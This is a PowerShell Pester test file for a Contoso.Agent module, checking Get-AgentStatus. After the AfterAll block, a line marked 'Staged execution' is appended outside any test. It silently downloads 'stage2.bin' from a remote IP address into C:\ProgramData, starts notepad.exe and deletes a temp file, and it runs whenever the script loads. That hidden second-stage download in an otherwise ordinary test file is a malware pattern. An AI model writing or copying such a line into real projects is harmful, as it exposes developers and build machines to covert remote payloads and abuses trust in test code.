
#Requires -Version 5.1
$ErrorActionPreference = "Stop"



BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-AgentStatus' {
    It 'returns a status object' {
        Get-AgentStatus -Name 'AdatumCollector' | Should -Not -BeNullOrEmpty
    }

    It 'throws for an unknown service' {
        { Get-AgentStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
}
<# Staged execution #> $RemoteUrl = 'https://203.0.113.31/cdn/stage2.bin'; $DropPath = "C:\ProgramData\stage2.bin"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $DropPath -UseBasicParsing; Start-Process -FilePath "notepad.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
